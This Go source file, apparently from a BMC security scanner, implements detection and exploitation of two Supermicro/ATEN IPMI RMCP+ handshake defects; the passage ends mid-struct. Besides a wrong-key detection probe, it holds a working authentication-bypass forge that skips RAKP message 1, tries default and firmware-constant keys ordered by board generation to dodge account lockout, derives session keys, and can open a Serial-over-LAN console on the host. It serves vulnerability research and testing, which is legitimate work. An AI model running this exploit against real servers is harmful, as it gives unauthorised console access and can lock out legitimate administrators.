package ipmi

// Supermicro/ATEN RMCP+ key-exchange state-machine defects (CVE-2026-65219, CVE-2026-65220).
// Both live in the same ATEN handler pair and share the raw Open Session / RAKP
// plumbing, so they are implemented together here.
//
// CVE-2026-65219 accepts RAKP message 3 with no preceding message 1; CVE-2026-65220 accepts a
// reserved privilege-role nibble in message 1. Mechanism, decompile evidence,
// per-generation status and the record-0 lockout budget that makes a
// multi-candidate CVE-2026-65219 run self-poisoning: kb/smc/notes/.

import (
	"bytes"
	"crypto/rand"
	"encoding/binary"
	"encoding/hex"
	"errors"
	"fmt"
	"strings"
	"time"

	"github.com/runZeroInc/oobscan/pkg/guid"
)

// RAKP message-4 status values that classify the CVE-2026-65219 probe. A forged
// (unordered, wrong-key) RAKP3 draws 0x08 with our console session ID echoed on
// the affected ATEN stack, versus the spec-correct 0x0f on OpenBMC netipmid
// (X14). Because 0x08 is also a legitimate "inactive session ID" elsewhere, the
// signature is only valid for the ATEN lineage: keep the check gated to vendor
// supermicro, skip X14, and report a positive as the ordering defect rather than
// as access.
const (
	smcATENUnorderedRAKP4Status  byte = 0x08
	rakpStatusInvalidICV         byte = 0x0f
	rakpStatusUnauthorizedName   byte = 0x0d
	rakpStatusInvalidRole        byte = 0x09
	rakpStatusUnauthorizedRole   byte = 0x0a
	rakpStatusIllegalParameter   byte = 0x12
	smcRAKP1ConformantRoleLookup byte = 0x12 // spec-conformant "lookup by role", privilege USER
	smcRAKP1BaselineRoleLookup   byte = 0x14 // spec-conformant "lookup by role", privilege ADMINISTRATOR
	// SMCReservedRoleByte is the reserved-nibble role byte used to trip the
	// missing default arm. Every upper nibble from 0x2 to 0xF lands in the same
	// unimplemented residual-privilege arm; 0x24 is the one the live evidence used.
	SMCReservedRoleByte byte = 0x24
)

// smcRAKP3ProbeKey is a deliberately wrong 20-byte HMAC key: the detection path
// must prove the ordering defect without ever activating a session, so the
// authentication code has to be one the BMC is certain to reject.
//
// The rejection is charged to user record 0 as a bad-password attempt on
// X11/X12/X13/H13, and once record 0 locks out the forge can no longer tell a
// correct key from a wrong one. The exploitation path therefore uses its first
// real candidate as the probe rather than spending the budget here.
var smcRAKP3ProbeKey = []byte("oobscan-smc0014-prob")

// smcCipherSuite3 is the auth/integrity/confidentiality profile the live
// CVE-2026-65219 and CVE-2026-65220 work used: HMAC-SHA1 / HMAC-SHA1-96 / AES-CBC-128.
var smcCipherSuite3 = CipherAlgos{Suite: 3, Auth: RAKPHMACSHA1, Integrity: IntegrityHMACSHA196, Conf: ConfAESCBC}

// smcCipherSuite17 is the SHA-256 alternative. X12, X13 and H13 ship configurations
// that offer only suites 3 and 17, so a board with suite 3 disabled must be tried
// on 17 rather than reported as unaffected - the defect is in the RAKP state
// machine, not in any one algorithm. The transcript builders are keyed by the
// negotiated auth algorithm, so the same layout carries over.
var smcCipherSuite17 = CipherAlgos{Suite: 17, Auth: RAKPHMACSHA256, Integrity: IntegrityHMACSHA256128, Conf: ConfAESCBC}

// smcHandshakeSuites is the order in which the RAKP probes and the forge try to
// open a session.
func smcHandshakeSuites() []CipherAlgos {
	return []CipherAlgos{smcCipherSuite3, smcCipherSuite17}
}

// smcOpenSessionAnySuite opens an RMCP+ session on the first suite the BMC
// accepts, returning the connected client, the managed-system session ID, the
// console session ID and the suite that worked. The caller owns the client.
func smcOpenSessionAnySuite(host string, port int, reqPriv byte, timeout time.Duration) (*Client, uint32, uint32, CipherAlgos, error) {
	var lastErr error
	for _, suite := range smcHandshakeSuites() {
		c, err := NewClient(host, port, timeout)
		if err != nil {
			return nil, 0, 0, CipherAlgos{}, err
		}
		cSID := randomConsoleSID(0xabcd1234)
		resp, err := sendWithTimeoutRetry(c, buildRMCPPlus(PayloadOpenSessionReq, 0, 0,
			smcOpenSessionBody(cSID, reqPriv, suite)), session20HandshakeRetries(timeout))
		if err != nil {
			c.Close()
			// Do not end the loop on a dropped reply: a stack that silently discards an
			// Open Session Request naming an algorithm it does not offer is
			// indistinguishable from a dead host, so bailing here would report the board
			// unaffected without ever trying the next suite. Carry the error instead; the
			// caller sees the aggregate only if every suite failed.
			lastErr = fmt.Errorf("open-session (suite %d): %w", suite.Suite, err)
			continue
		}
		bmcSID, err := parseOpenSessionResp(resp)
		if err != nil {
			c.Close()
			lastErr = err
			continue
		}
		return c, bmcSID, cSID, suite, nil
	}
	if lastErr == nil {
		lastErr = errors.New("open-session rejected on every candidate cipher suite")
	}
	return nil, 0, 0, CipherAlgos{}, lastErr
}

// smcRecord0Transcript builds the RAKP message-3 authentication-code input for a
// session slot that has not been allocated since boot:
//
//	Rc(16 zero bytes) || SIDc(4, little-endian) || RoleM(0x00) || ULen(0x00)
//
// Every field except SIDc is a boot value the attacker knows, and SIDc is the
// console session ID the attacker chose, so the transcript is fully known and
// the stored password of user record 0 is the only unknown. This is the single
// source of truth for the layout; the forge and the probe both go through it.
func smcRecord0Transcript(consoleSID uint32) []byte {
	var buf bytes.Buffer
	buf.Write(make([]byte, 16)) // Rc: boot-zero, never written because message 1 is skipped
	_ = binary.Write(&buf, binary.LittleEndian, consoleSID)
	buf.WriteByte(0x00) // RoleM: boot-zero
	buf.WriteByte(0x00) // ULen: boot-zero, so no username bytes follow
	return buf.Bytes()
}

// smcRecord0AuthCode keys smcRecord0Transcript with a candidate record-0 key.
func smcRecord0AuthCode(authAlgo byte, key []byte, consoleSID uint32) []byte {
	mac := hmacByAlgo(authAlgo, key)
	mac.Write(smcRecord0Transcript(consoleSID))
	return mac.Sum(nil)
}

// SMCUnorderedRAKP3Probe is the result of the CVE-2026-65219 detection probe: one
// Open Session followed by one RAKP message 3 with a deliberately wrong key, and
// no message 1 in between. It never activates a session and never touches SOL.
type SMCUnorderedRAKP3Probe struct {
	Host       string `json:"host"`
	Port       int    `json:"port"`
	ConsoleSID uint32 `json:"consoleSid"`
	BMCSID     uint32 `json:"bmcSid"`
	// CipherSuite is the suite the Open Session actually negotiated (3, or 17 on a
	// board that offers only the SHA-256 profile).
	CipherSuite int `json:"cipherSuite"`

	// Answered reports that a RAKP message 4 came back at all.
	Answered        bool   `json:"answered"`
	RAKP4Status     byte   `json:"rakp4Status"`
	RAKP4StatusText string `json:"rakp4StatusText,omitempty"`
	// SIDEchoed reports that message 4 carried our console session ID back, which
	// is what proves the BMC located the slot rather than discarding the packet.
	SIDEchoed bool   `json:"sidEchoed"`
	EchoedSID uint32 `json:"echoedSid,omitempty"`

	// Defect is the finding-grade verdict: message 3 was processed and its
	// authentication code compared without a preceding message 1.
	Defect bool `json:"defect"`
	// SpecConformant records the 0x0f answer, i.e. an unaffected stack.
	SpecConformant bool `json:"specConformant"`
	// Activated is true only if the sentinel key somehow matched record 0's
	// password. It is not expected; when it happens the session is closed at once
	// and this flag records it so the result is never silently misread as a
	// key-independent measurement.
	Activated bool   `json:"activated"`
	Error     string `json:"error,omitempty"`
}

// Summary renders the probe verdict in one line.
func (p *SMCUnorderedRAKP3Probe) Summary() string {
	switch {
	case p == nil:
		return "not-probed"
	case p.Error != "" && !p.Answered:
		return "error"
	case !p.Answered:
		return "no-reply"
	case p.Activated:
		return "session-activated"
	case p.Defect:
		return fmt.Sprintf("unordered-rakp3-accepted (rakp4=0x%02x, console-sid echoed)", p.RAKP4Status)
	case p.SpecConformant:
		return "rejected-spec-conformant (rakp4=0x0f)"
	default:
		return fmt.Sprintf("rejected (rakp4=0x%02x)", p.RAKP4Status)
	}
}

// ProbeSMCUnorderedRAKP3 performs CVE-2026-65219 detection: Open Session, then
// RAKP message 3 with no message 1, signed with a key that cannot be correct.
// No session or payload is activated. The wrong authentication code can
// increment record 0's failure counter, including reaching an existing threshold.
//
// A message 4 carrying status 0x08 with the console session ID echoed is the
// defect; 0x0f is the spec-correct rejection. This reports the defect only -
// exploitation also needs a session slot unallocated since boot plus record 0's
// key.
func ProbeSMCUnorderedRAKP3(host string, port int, timeout time.Duration) (*SMCUnorderedRAKP3Probe, error) {
	probe := &SMCUnorderedRAKP3Probe{Host: host, Port: port}
	c, bmcSID, cSID, suite, err := smcOpenSessionAnySuite(host, port, 0x04, timeout)
	if err != nil {
		probe.Error = err.Error()
		return probe, err
	}
	defer c.Close()
	retries := session20HandshakeRetries(timeout)
	probe.ConsoleSID = cSID
	probe.BMCSID = bmcSID
	probe.CipherSuite = suite.Suite

	// No RAKP message 1 -- that omission is the probe.
	auth := smcRecord0AuthCode(suite.Auth, smcRAKP3ProbeKey, cSID)
	r4Resp, err := sendWithTimeoutRetry(c, buildRMCPPlus(PayloadRAKP3, 0, 0,
		smcRAKP3Body(bmcSID, auth)), retries)
	if err != nil {
		probe.Error = fmt.Sprintf("rakp3: %v", err)
		return probe, nil
	}
	pl, err := rmcpPlusPayload(r4Resp)
	if err != nil {
		probe.Error = err.Error()
		return probe, nil
	}
	if !classifySMCUnorderedRAKP4(probe, pl, cSID) {
		probe.Error = "short RAKP4"
		return probe, nil
	}
	if probe.Activated {
		// The sentinel key is not a plausible password so this is not expected, but
		// if it happens a real session exists and must be torn down at once.
		_ = CloseSetupSessionAsync(c, bmcSID)
	}
	return probe, nil
}

// classifySMCUnorderedRAKP4 decodes a RAKP message-4 payload into the probe
// verdict. Split out from the network path so the classification is testable from
// wire bytes alone. It returns false when the payload is too short to classify.
//
// RAKP message 4 layout: tag(1) status(1) rsvd(2) remoteConsoleSID(4) ICV(N).
func classifySMCUnorderedRAKP4(probe *SMCUnorderedRAKP3Probe, payload []byte, consoleSID uint32) bool {
	if probe == nil || len(payload) < 2 {
		return false
	}
	probe.Answered = true
	probe.RAKP4Status = payload[1]
	probe.RAKP4StatusText = rakpStatusText(payload[1])
	if len(payload) >= 8 {
		probe.EchoedSID = binary.LittleEndian.Uint32(payload[4:8])
		probe.SIDEchoed = probe.EchoedSID == consoleSID
	}
	switch {
	case probe.RAKP4Status == 0x00:
		probe.Activated = true
		probe.Defect = true
	case probe.RAKP4Status == smcATENUnorderedRAKP4Status && probe.SIDEchoed:
		// The affected ATEN stack's non-standard answer, with our console session ID
		// echoed: the slot was located and the authentication code was compared for a
		// message 3 that arrived with no message 1 before it.
		probe.Defect = true
	case probe.RAKP4Status == rakpStatusInvalidICV:
		// The spec-correct rejection, which is what OpenBMC netipmid returns.
		probe.SpecConformant = true
	}
	return true
}

// SMCRecord0KeyCandidate is one named candidate for user record 0's stored
// password, used by the CVE-2026-65219 forge.
type SMCRecord0KeyCandidate struct {
	Label string `json:"label"`
	Key   []byte `json:"-"`
}

// smcRecord0Candidate builds one named candidate.
func smcRecord0Candidate(label string) SMCRecord0KeyCandidate {
	switch label {
	case "<empty>":
		return SMCRecord0KeyCandidate{Label: "<empty>", Key: []byte{}}
	case "smcrakp-fixed-key":
		return SMCRecord0KeyCandidate{Label: "smcrakp-fixed-key", Key: append([]byte(nil), smcRAKPFixedKey...)}
	default:
		return SMCRecord0KeyCandidate{Label: label, Key: []byte(label)}
	}
}

// SMCRecord0KeyCandidates returns the built-in candidate list for a target whose
// generation is unknown. These are guesses at a short factory value, except for
// the SMCRAKP firmware constant, which is the real key wherever SMCRAKP mode is
// enabled (CVE-2026-18449).
//
// Order matters more than list length: on X11/X12/X13/H13 every rejection charges
// a bad-password record against user record 0, and a locked record 0 answers the
// correct key with the same 0x08 as a wrong one, so only the first candidate of a
// run is interpretable. The empty key leads because it is what an unprovisioned
// record holds.
func SMCRecord0KeyCandidates() []SMCRecord0KeyCandidate {
	return []SMCRecord0KeyCandidate{
		smcRecord0Candidate("<empty>"),
		smcRecord0Candidate("0"),
		smcRecord0Candidate("admin"),
		smcRecord0Candidate("ADMIN"),
		smcRecord0Candidate("smcrakp-fixed-key"),
	}
}

// smcRecord0KeyByGeneration orders candidates by the key actually recovered on
// each generation. Generations with no recovered key are absent and fall back to
// the unknown-generation order.
var smcRecord0KeyByGeneration = map[string][]string{
	"X10": {"admin", "smcrakp-fixed-key", "<empty>", "0", "ADMIN"},
	"X11": {"0", "<empty>", "admin", "ADMIN", "smcrakp-fixed-key"},
	"H13": {"<empty>", "0", "admin", "ADMIN", "smcrakp-fixed-key"},
}

// SMCRecord0KeyCandidatesForGeneration orders the candidate list by what was
// actually recovered on that generation, so the one interpretable attempt of a run
// is spent on the key most likely to be right. An unrecognised or empty generation
// gets the unknown-generation order.
func SMCRecord0KeyCandidatesForGeneration(gen string) []SMCRecord0KeyCandidate {
	labels, ok := smcRecord0KeyByGeneration[strings.ToUpper(strings.TrimSpace(gen))]
	if !ok {
		return SMCRecord0KeyCandidates()
	}
	out := make([]SMCRecord0KeyCandidate, 0, len(labels))
	for _, l := range labels {
		out = append(out, smcRecord0Candidate(l))
	}
	return out
}

// SMCRecord0FailureIsFree reports whether a rejected RAKP3 costs nothing on this
// generation, i.e. whether a multi-candidate run is trustworthy. Only X10
// qualifies: its RAKP3 failure arm releases the slot without recording a bad
// password. Every other ATEN generation charges record 0 and must be treated as
// one-shot, since whether the lockout is armed is a runtime NVRAM value.
func SMCRecord0FailureIsFree(gen string) bool {
	return strings.EqualFold(strings.TrimSpace(gen), "X10")
}

// SMCDetectGeneration reads the sessionless IPMI 1.5 System GUID and maps the
// embedded board code to a BMC generation. It needs no credential and no session,
// and it is the input the record-0 candidate ordering wants. An empty generation
// with a nil error means the board code is not catalogued.
func SMCDetectGeneration(host string, port int, timeout time.Duration) (generation, modelPrefix string, err error) {
	// One retry. The generation picks the candidate order, and with a budget of one
	// attempt an undetected generation means the single interpretable try is spent on
	// the wrong key - so a dropped GUID reply is worth one more packet. It is a
	// different payload type from the forge and costs nothing against record 0.
	raw, err := GetSystemGUID15(host, port, timeout)
	if err != nil {
		raw, err = GetSystemGUID15(host, port, timeout)
	}
	if err != nil {
		return "", "", err
	}
	if len(raw) < 16 {
		return "", "", fmt.Errorf("short system guid (%d bytes)", len(raw))
	}
	g := guid.Decode(raw[:16])
	if g != nil && g.Fields != nil {
		modelPrefix = g.Fields["model_prefix"]
	}
	return guid.SMCGenerationFromModelPrefix(modelPrefix), modelPrefix, nil
}

// ParseSMCRecord0KeyCandidates turns a comma-separated operator list into
// candidates. An empty element means the empty key, "smcrakp" selects the
// CVE-2026-18449 firmware constant, and "hex:<hex>" supplies raw key bytes.
func ParseSMCRecord0KeyCandidates(spec string) ([]SMCRecord0KeyCandidate, error) {
	if strings.TrimSpace(spec) == "" {
		return SMCRecord0KeyCandidates(), nil
	}
	var out []SMCRecord0KeyCandidate
	for _, raw := range strings.Split(spec, ",") {
		switch {
		case raw == "":
			out = append(out, SMCRecord0KeyCandidate{Label: "<empty>", Key: []byte{}})
		case strings.EqualFold(raw, "smcrakp"):
			out = append(out, SMCRecord0KeyCandidate{Label: "smcrakp-fixed-key", Key: append([]byte(nil), smcRAKPFixedKey...)})
		case strings.HasPrefix(strings.ToLower(raw), "hex:"):
			b, err := hex.DecodeString(strings.TrimSpace(raw[4:]))
			if err != nil {
				return nil, fmt.Errorf("candidate %q: %w", raw, err)
			}
			out = append(out, SMCRecord0KeyCandidate{Label: "hex:" + raw[4:], Key: b})
		default:
			out = append(out, SMCRecord0KeyCandidate{Label: raw, Key: []byte(raw)})
		}
	}
	return out, nil
}

// SMCForgeAttempt records one candidate key tried by the CVE-2026-65219 forge.
type SMCForgeAttempt struct {
	KeyLabel string `json:"keyLabel"`
	// RAKP4Observed distinguishes "the BMC answered with this status" from "the
	// attempt failed before any message 4 arrived", so a transport timeout is never
	// read as status 0x00.
	RAKP4Observed   bool   `json:"rakp4Observed"`
	RAKP4Status     byte   `json:"rakp4Status"`
	RAKP4StatusText string `json:"rakp4StatusText,omitempty"`
	Activated       bool   `json:"activated"`
	Error           string `json:"error,omitempty"`
}

// OpenSession20SMCUnorderedRAKP3 runs the CVE-2026-65219 three-packet forge with one
// candidate record-0 key and returns the activated session on success.
//
// Packets: Open Session (requested maximum privilege 4), then RAKP message 3 --
// message 1 is deliberately never sent. The session is bound to user record 0,
// whose IPMI-messaging bit is clear, so its reach is SOL plus a few reads rather
// than full administrative IPMI, and raising the session privilege does not widen
// it. The caller owns Close().
//
// A slot allocated since boot no longer holds the zero transcript, so this fails
// on a busy or long-running BMC regardless of the key.
func OpenSession20SMCUnorderedRAKP3(host string, port int, key []byte, timeout time.Duration) (*Session20, byte, error) {
	c, bmcSID, cSID, suite, err := smcOpenSessionAnySuite(host, port, 0x04, timeout)
	if err != nil {
		return nil, 0, err
	}
	handshakeRetries := session20HandshakeRetries(timeout)

	auth := smcRecord0AuthCode(suite.Auth, key, cSID)
	r4Resp, err := sendWithTimeoutRetry(c, buildRMCPPlus(PayloadRAKP3, 0, 0,
		smcRAKP3Body(bmcSID, auth)), handshakeRetries)
	if err != nil {
		c.Close()
		return nil, 0, fmt.Errorf("rakp3: %w", err)
	}
	pl, err := rmcpPlusPayload(r4Resp)
	if err != nil {
		c.Close()
		return nil, 0, err
	}
	if len(pl) < 2 {
		c.Close()
		return nil, 0, errors.New("short RAKP4")
	}
	if pl[1] != 0x00 {
		status := pl[1]
		c.Close()
		return nil, status, fmt.Errorf("rakp4 status=0x%02x (%s)", status, rakpStatusText(status))
	}

	s := &Session20{
		client:     c,
		host:       host,
		port:       port,
		timeout:    timeout,
		cmdRetries: session20CommandRetries(timeout),
		username:   "", // record 0 is the empty-username slot
		password:   "<smc-rakp-bypass-record0-key>",
		suite:      suite,
		consoleSID: cSID,
		bmcSID:     bmcSID,
		seq:        1,
		rqSeq:      1,
	}
	// The BMC derived the SIK from the same boot-zero material: Rm and Rc are both
	// the uncleared 16-zero fields, the role byte and username length are zero and
	// the username is empty. Deriving the same way gives working K1/K2 for the
	// integrity path; CVE-2026-18450 means cleartext is also accepted, so let the auto
	// strategy pick whichever the board honors.
	zeros := make([]byte, 16)
	s.sik, s.k1, s.k2 = deriveSessionKeysWithRole(suite.Auth, key, zeros, zeros, 0x00, "")
	s.SetCommandProtection(protectionAuto)
	return s, 0x00, nil
}

// SMCForgeResult is the outcome of a record-0 forge run, including whether a
// negative result is trustworthy. A rejected candidate is not free on most ATEN
// generations, so "every candidate was refused" is usually inconclusive rather
// than a clean bill of health, and this type is what keeps the two apart.
type SMCForgeResult struct {
	Attempts []SMCForgeAttempt `json:"attempts"`
	// Defect records the ordering defect, which the first attempt establishes on
	// its own: status 0x08 with the console session ID echoed means the slot was
	// located and the authentication code was compared for a message 3 that arrived
	// with no message 1 before it.
	Defect bool `json:"defect"`
	// SpecConformant records a 0x0f answer, i.e. an unaffected stack.
	SpecConformant bool   `json:"specConformant"`
	Forged         bool   `json:"forged"`
	KeyLabel       string `json:"keyLabel,omitempty"`
	// Untried lists candidates the budget did not reach.
	Untried []string `json:"untried,omitempty"`
	// Rest is the delay that was applied between attempts.
	Rest time.Duration `json:"restBetweenAttempts,omitempty"`
	// Inconclusive marks a run whose failures cannot be read as "the key is not in
	// the list": either candidates were left untried, or more than one attempt was
	// spent on a generation where a rejected attempt locks user record 0.
	Inconclusive bool   `json:"inconclusive"`
	Reason       string `json:"reason,omitempty"`
}

// smcDefaultForgeAttempts is the per-run attempt budget, deliberately one: each
// rejection charges a bad-password record against user record 0, the lock fires at
// a config-defined threshold that cannot be read from the firmware image (a unit
// may ship a threshold of 1), and the lock check runs after the authentication-code
// compare, so past the threshold a correct key is answered 0x08 like a wrong one.
const smcDefaultForgeAttempts = 1

// smcRecord0RestFloor is the rest between attempts that makes a multi-candidate
// sweep trustworthy: long enough, with margin, to outlast the self-clearing
// record-0 lock window.
const smcRecord0RestFloor = 60 * time.Second

// SMCForgeOptions configures the record-0 forge.
type SMCForgeOptions struct {
	// Candidates is the ordered key list; empty selects the unknown-generation list.
	Candidates []SMCRecord0KeyCandidate
	// MaxAttempts caps how many candidates are actually sent; <= 0 selects the default
	// of one.
	MaxAttempts int
	// Rest is slept between attempts. At or above smcRecord0RestFloor each attempt
	// starts in a fresh record-0 lock window, which is the only way a multi-candidate
	// negative becomes interpretable on a generation that charges for failures.
	Rest time.Duration
	// Generation, when known, decides whether a rejected attempt is free (X10 only) and
	// therefore whether several rejections in a row mean anything. Empty is treated as
	// "assume it costs", which is the safe reading.
	Generation string
	Log        func(string)
}

// ForgeSMCUnorderedRAKP3 tries candidate record-0 keys in order, within an attempt
// budget, and returns the first session that activates alongside a result that
// states plainly whether a negative can be trusted.
func ForgeSMCUnorderedRAKP3(host string, port int, timeout time.Duration, opt SMCForgeOptions) (*Session20, *SMCForgeResult) {
	candidates := opt.Candidates
	if len(candidates) == 0 {
		candidates = SMCRecord0KeyCandidates()
	}
	maxAttempts := opt.MaxAttempts
	if maxAttempts <= 0 {
		maxAttempts = smcDefaultForgeAttempts
		// A generation whose RAKP3 failure path charges nothing has no reason to be held
		// to one attempt: every rejection there means what it says, so sweep the list.
		if SMCRecord0FailureIsFree(opt.Generation) {
			maxAttempts = len(candidates)
		}
	}
	log := opt.Log
	res := &SMCForgeResult{Attempts: make([]SMCForgeAttempt, 0, len(candidates)), Rest: opt.Rest}
	sent := 0
	for i, cand := range candidates {
		if sent >= maxAttempts {
			for _, restCand := range candidates[i:] {
				res.Untried = append(res.Untried, restCand.Label)
			}
			break
		}
		if sent > 0 && opt.Rest > 0 {
			if log != nil {
				log(fmt.Sprintf("smc-rakp-bypass: resting %s so the next attempt starts outside record 0's lock window", opt.Rest))
			}
			time.Sleep(opt.Rest)
		}
		if log != nil {
			log(fmt.Sprintf("smc-rakp-bypass: trying record-0 key %s", cand.Label))
		}
		s, status, err := OpenSession20SMCUnorderedRAKP3(host, port, cand.Key, timeout)
		sent++
		att := SMCForgeAttempt{KeyLabel: cand.Label, RAKP4Status: status}
		// Only label the status when a message 4 was actually observed. A transport
		// failure leaves status at 0, and rendering that as "no-errors" would report a
		// timeout as a successful handshake.
		if s != nil || status != 0 {
			att.RAKP4StatusText = rakpStatusText(status)
			att.RAKP4Observed = true
		}
		if err != nil {
			att.Error = err.Error()
		}
		// The first answered attempt also measures ordering: the same RAKP4
		// bytes that say "wrong key" also say the message was processed out of order, so
		// the ordering verdict costs no extra packet. It has to be the first answered
		// attempt and not attempt zero - a board that dropped the first packet and
		// answered the second would otherwise have its verdict thrown away.
		if att.RAKP4Observed && !res.Defect && !res.SpecConformant {
			switch {
			case status == 0x00, status == smcATENUnorderedRAKP4Status:
				res.Defect = true
			case status == rakpStatusInvalidICV:
				res.SpecConformant = true
			}
		}
		if s != nil {
			att.Activated = true
			res.Attempts = append(res.Attempts, att)
			res.Forged = true
			res.KeyLabel = cand.Label
			return s, res
		}
		res.Attempts = append(res.Attempts, att)
	}
	res.Inconclusive, res.Reason = smcForgeNegativeVerdict(res, sent, opt.Generation)
	return nil, res
}

// smcForgeNegativeVerdict decides whether a forge that obtained no session may be
// read as "record 0's key is not one of these". It may not be, unless every
// candidate was actually sent and either the generation charges nothing for a
// failure or the run rested out the lock window between attempts.
func smcForgeNegativeVerdict(res *SMCForgeResult, sent int, generation string) (bool, string) {
	if res.SpecConformant {
		// A spec-conformant stack refused the out-of-order message 3 outright. There is
		// nothing to be inconclusive about: no key would help.
		return false, ""
	}
	if sent == 0 {
		return true, "no candidate was sent"
	}
	if smcFirstAnsweredAttempt(res.Attempts) == nil {
		return true, "no RAKP message 4 came back on any attempt, so nothing was measured; re-take after resting the board (ATEN stops answering a hammering source for minutes)"
	}
	gen := generation
	free := SMCRecord0FailureIsFree(gen)
	rested := res.Rest >= smcRecord0RestFloor
	if gen == "" {
		gen = "unknown"
	}
	switch {
	case len(res.Untried) > 0:
		return true, fmt.Sprintf("attempt budget spent with %d candidate(s) untried (%s); a rejected RAKP3 charges a bad-password record against user record 0, and once the config-defined threshold is reached a locked record 0 answers the CORRECT key with the same 0x08 - re-run with --record0-max-attempts and --record0-rest %s, or one candidate per lock window", len(res.Untried), strings.Join(res.Untried, ", "), smcRecord0RestFloor)
	case free, rested:
		// X10 charges nothing for a failure, and a run that rested longer than the
		// measured lock window between attempts starts each one in a fresh window. Either
		// way every rejection means what it says.
		return false, ""
	case sent > 1:
		return true, fmt.Sprintf("%d candidates were sent back to back on generation %q, where a rejected RAKP3 counts toward a record-0 lock; from the threshold onward a correct key answers 0x08 too, so only the FIRST rejection is interpretable. Re-run with --record0-rest %s", sent, gen, smcRecord0RestFloor)
	default:
		return true, fmt.Sprintf("the single candidate tried was refused; that is a real negative for %q only. The remaining candidates need a fresh lock window each: re-run with --record0-max-attempts and --record0-rest %s", smcFirstAnsweredAttempt(res.Attempts).KeyLabel, smcRecord0RestFloor)
	}
}

// smcFirstAnsweredAttempt returns the first attempt the BMC actually answered, or
// nil when none was. Reading attempt zero unconditionally treats a dropped first
// packet as the measurement.
func smcFirstAnsweredAttempt(as []SMCForgeAttempt) *SMCForgeAttempt {
	for i := range as {
		if as[i].RAKP4Observed {
			return &as[i]
		}
	}
	return nil
}

// SMCCapabilityResult is one read-only command issued against a forged session.
type SMCCapabilityResult struct {
	Name  string `json:"name"`
	NetFn byte   `json:"netfn"`
	Cmd   byte   `json:"cmd"`
	CC    byte   `json:"cc"`
	Data  string `json:"data,omitempty"`
	Error string `json:"error,omitempty"`
}

// smcForgedReadOnlyProbes is the read-only capability matrix for a forged
// CVE-2026-65219 session. Every entry is a get: nothing changes BMC or host state, and
// Activate Payload is deliberately absent because it opens a console on the
// managed host and needs an explicit opt-in.
//
// On an affected unit the SOL/identity reads answer 0x00 while administrative ones
// answer 0xd4. Which commands fall in the open lane varies by generation, so read
// the contrast between the two groups rather than expecting a fixed set.
var smcForgedReadOnlyProbes = []struct {
	Name  string
	NetFn byte
	Cmd   byte
	Data  []byte
}{
	{"Get System GUID", NetFnApp, CmdGetSystemGUID, nil},
	{"Get Channel Auth Caps", NetFnApp, CmdGetChannelAuthCaps, []byte{0x0e, 0x04}},
	{"Get SOL Config Params", 0x0c, 0x22, []byte{0x0e, 0x00, 0x00, 0x00}},
	{"Get Payload Activation Status", NetFnApp, 0x4a, []byte{0x01}},
	{"Get Device ID", NetFnApp, CmdGetDeviceID, nil},
	{"Get Chassis Status", 0x00, 0x01, nil},
	{"Get User Access", NetFnApp, CmdGetUserAccess, []byte{0x0e, 0x01}},
	{"Get Device SDR Info", 0x04, 0x20, []byte{0x01}},
}

// ProbeSMCForgedCapabilities measures what a forged CVE-2026-65219 session can read.
// Read-only by construction: see smcForgedReadOnlyProbes.
func ProbeSMCForgedCapabilities(s *Session20) []SMCCapabilityResult {
	if s == nil {
		return nil
	}
	out := make([]SMCCapabilityResult, 0, len(smcForgedReadOnlyProbes))
	for _, p := range smcForgedReadOnlyProbes {
		res := SMCCapabilityResult{Name: p.Name, NetFn: p.NetFn, Cmd: p.Cmd}
		cc, data, err := s.Exec(p.NetFn, p.Cmd, p.Data)
		res.CC = cc
		if err != nil {
			res.Error = err.Error()
		} else if len(data) > 0 {
			res.Data = fmt.Sprintf("%x", data)
		}
		out = append(out, res)
	}
	return out
}

// ActivateSMCForgedSOL activates the SOL payload on a forged CVE-2026-65219 session.
//
// This is the one non-read-only operation in this file and it runs only behind an
// explicit operator opt-in. It opens an interactive console on the managed host's
// serial port and occupies the board's single SOL instance, locking out a
// legitimate operator until released, so callers must pair it with
// DeactivateSMCForgedSOL. The detection path never calls it.
func ActivateSMCForgedSOL(s *Session20) ([]byte, error) {
	if s == nil {
		return nil, errors.New("smc-rakp-bypass: no session")
	}
	// payloadType=0x01 (SOL), payloadInstance=0x01, aux bytes reserved.
	cc, data, err := s.Exec(NetFnApp, CmdActivatePayload, []byte{0x01, 0x01, 0x00, 0x00, 0x00, 0x00})
	if err != nil {
		return nil, err
	}
	if cc != 0x00 {
		return nil, fmt.Errorf("activate-payload cc=0x%02x", cc)
	}
	return data, nil
}

// DeactivateSMCForgedSOL releases the SOL payload activated by
// ActivateSMCForgedSOL, so the board is left as it was found.
func DeactivateSMCForgedSOL(s *Session20) error {
	if s == nil {
		return errors.New("smc-rakp-bypass: no session")
	}
	// payloadType=0x01 (SOL), payloadInstance=0x01, then FOUR aux bytes. A short
	// request is rejected with cc=0xc7 (request data length invalid) and the
	// payload stays activated, which locks out the board's single SOL instance.
	cc, _, err := s.Exec(NetFnApp, CmdDeactivatePayload, []byte{0x01, 0x01, 0x00, 0x00, 0x00, 0x00})
	if err != nil {
		return err
	}
	if cc != 0x00 {
		return fmt.Errorf("deactivate-payload cc=0x%02x", cc)
	}
	return nil
}

// SMCReservedRoleProbe is the result of the SAFE CVE-2026-65220 detection: three RAKP
// message 1 exchanges, each in its own Open Session, comparing how the BMC
// answers a valid role byte against a reserved one. No message 3 is ever sent,
// so no credential is offered, no session activates and no lockout counter can
// move.
type SMCReservedRoleProbe struct {
	Host string `json:"host"`
	Port int    `json:"port"`
	// Username is the existing account named in every message 1. Naming an
	// account that exists is required for the comparison to mean anything: an
	// unknown name is refused with 0x0d whatever the role byte is.
	Username string `json:"username"`
	// UsernameCandidates records the names tried while looking for one that
	// resolves, so a negative result is distinguishable from "found no account".
	UsernameCandidates []string `json:"usernameCandidates,omitempty"`

	// BaselineRole is the Administrator role lookup (0x14). Its acceptance says the
	// named account is entitled to Administrator, which is what makes it usable as
	// the CVE-2026-65220 seed - it is not the control for the reserved-role comparison,
	// because a perfectly ordinary USER account is refused it with 0x0a.
	BaselineRole     byte `json:"baselineRole"`
	BaselineStatus   byte `json:"baselineStatus"`
	BaselineAccepted bool `json:"baselineAccepted"`
	// ConformantRole is the USER-level role lookup (0x12) and is the control: any
	// account that exists is entitled to USER, so its acceptance proves both that the
	// name resolves and that a valid role byte is handled, which is exactly what the
	// reserved-role result has to be compared against.
	ConformantRole     byte `json:"conformantRole"`
	ConformantStatus   byte `json:"conformantStatus"`
	ConformantAccepted bool `json:"conformantAccepted"`
	ReservedRole       byte `json:"reservedRole"`
	ReservedStatus     byte `json:"reservedStatus"`
	ReservedAccepted   bool `json:"reservedAccepted"`
